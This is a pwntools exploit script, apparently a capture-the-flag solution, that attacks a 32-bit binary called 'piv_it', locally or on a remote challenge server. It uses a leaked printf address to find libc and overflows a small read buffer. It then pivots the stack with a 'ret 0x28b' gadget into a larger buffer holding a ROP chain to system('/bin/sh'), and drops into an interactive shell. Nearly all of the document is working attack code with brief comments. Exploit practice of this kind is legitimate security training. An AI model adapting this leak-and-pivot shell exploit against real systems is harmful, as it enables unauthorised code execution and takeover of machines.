from pwn import *

PROG_NAME = "./piv_it"
REMOTE_IP = "plsdonthaq.me"
REMOTE_PORT = 8002
REMOTE_LIBC = "./libc6_2.27-3ubuntu1_i386.so"
LOCAL_LIBC = "/lib/i386-linux-gnu/libc.so.6"

if args.REMOTE:
    p = remote(REMOTE_IP, REMOTE_PORT)
    elf = ELF(PROG_NAME)
    libc = ELF(REMOTE_LIBC)
    pivot_gadget = 0x0007540d # ret 0x28b;
    ret_gadget = 0x00000417 # ret;
else:
    p = process(PROG_NAME)
    elf = p.elf
    libc = ELF(LOCAL_LIBC)
    pivot_gadget = 0x000af05b # ret 0x28b;
    ret_gadget = 0x0009f43d # ret;

if args.ATTACH:
	gdb.attach(p, '''break main''')

# take the libc printf address leak
p.recvuntil("At: ")
printf_libc = int(p.recvline().rstrip(), 16)
libc.address = printf_libc - libc.symbols['printf']

'''
main has the following code:
sub     esp, 0x4
push    0x80 {var_338}
lea     eax, [ebp-0xa0 {var_a8}]
push    eax {var_a8} {var_33c_1}
push    0x0
call    read

we load our system() rop payload into this bigger buffer, since 0x80 bytes are read
'''

payload = b'AAA'
payload += p32(libc.address+ret_gadget)
payload += p32(libc.symbols['system'])
payload += p32(0xdeadbeef)
payload += p32(next(libc.search(b'/bin/sh')))
p.sendline(payload)

# take the binary's main function address leak
# this is only used to get the binary base to use
# puts(puts) to work out the libc version
p.recvuntil("At: ")
main_leak = int(p.recvline().rstrip(), 16)
elf.address = main_leak - elf.symbols['main']

'''
in vuln we have:
push    0x38 {var_34}
lea     eax, [ebp-0x1c {var_20}]
push    eax {var_20} {var_38}
push    0x0 {var_3c}
call    read

so there's a clear buffer overflow, but won't be enough for a
full rop chain so we'll need to do a stack pivot, to our bigger buffer

in main we had:
ebp = esp+0x328

buffer was at ebp-0xa0 = esp+0x288

closest gadget:
remote:
0x0007540d: ret 0x28b;

local:
0x000af05b: ret 0x28b;

lose 0x3 bytes, since esp+0x28b = (esp+0x288)+3

'''

pivot_payload = flat({0x20 : p32(libc.address + pivot_gadget),
					  0x24 : p32(libc.address + ret_gadget)})

'''pivot_payload = flat({0x18 : p32(elf.symbols['_GLOBAL_OFFSET_TABLE_']),
					  0x20 : p32(elf.symbols['puts']),
					  0x24 : p32(0xdeadbeef),
					  0x28 : p32(elf.got['puts'])})'''

p.sendline(pivot_payload)

p.interactive()